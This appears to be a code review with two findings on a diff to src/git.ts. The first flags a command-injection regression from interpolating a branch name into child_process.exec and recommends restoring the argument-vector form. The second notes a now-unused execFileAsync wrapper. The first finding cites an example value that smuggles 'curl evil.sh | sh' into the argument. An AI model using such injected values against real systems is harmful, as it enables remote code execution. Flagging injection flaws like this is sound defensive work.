findings.title: [P1] Avoid shell interpolation of `branch` in `showBranch`
findings.body: `src/git.ts:7-8` interpolates the function's exported `branch` parameter into a template string executed by `child_process.exec`, i.e. `/bin/sh -c "git show <branch>"`. Any caller-supplied value containing shell metacharacters (`;`, `&&`, `$(…)`, backticks, etc.) executes arbitrary commands with the process's privileges — e.g. `showBranch("main; curl evil.sh | sh")`. The replaced `execFileAsync("git", ["show", branch])` passed the value as a single literal argv element with no shell parsing, so this diff is a direct command-injection regression on an exported API. It also breaks otherwise-valid revision arguments that shell-expand (e.g. globs or `$`-containing refs). Restore the argument-vector form (or shell-escape/validate the input).

findings.title: [nit] Remove the now-unused `execFileAsync` wrapper
findings.body: With the only call site replaced, `const execFileAsync = promisify(execFile);` at `src/git.ts:4` (and the `execFile` import feeding it) is dead code — repository-wide search shows no remaining references and it is not exported. Dropping it keeps the module honest about what it actually uses.
